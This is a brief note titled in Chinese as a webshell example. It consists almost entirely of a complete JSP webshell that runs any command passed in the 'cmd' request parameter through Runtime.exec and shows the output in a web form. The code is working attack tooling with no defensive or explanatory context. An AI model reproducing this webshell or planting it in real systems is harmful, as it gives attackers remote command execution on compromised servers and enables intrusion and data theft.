- # webshell示例
	- ```jsp
	  <%@ page import="java.io.*" %>
	  <%
	  String cmd = request.getParameter("cmd");
	  String output = "";
	  if(cmd != null) {
	      String s = null;
	      try {
	          Process p = Runtime.getRuntime().exec(cmd);
	          BufferedReader stdInput = new BufferedReader(new 
	  InputStreamReader(p.getInputStream()));
	          BufferedReader stdError = new BufferedReader(new 
	  InputStreamReader(p.getErrorStream()));
	          while ((s = stdInput.readLine()) != null) {
	              output += s+"\n";
	          }
	          while ((s = stdError.readLine()) != null) {
	              output += s+"\n";
	          }
	      }
	      catch (IOException e) {
	          e.printStackTrace();
	      }
	  }
	  %>
	  <html>
	  <head>
	  <title>JSP Webshell</title>
	  </head>
	  <body>
	  <form method="GET" action="<%=request.getRequestURI()%>">
	  <input type="text" name="cmd" size="80">
	  <input type="submit" value="Execute">
	  </form>
	  <pre>
	  <%=output %>
	  </pre>
	  </body>
	  </html>
	  
	  ```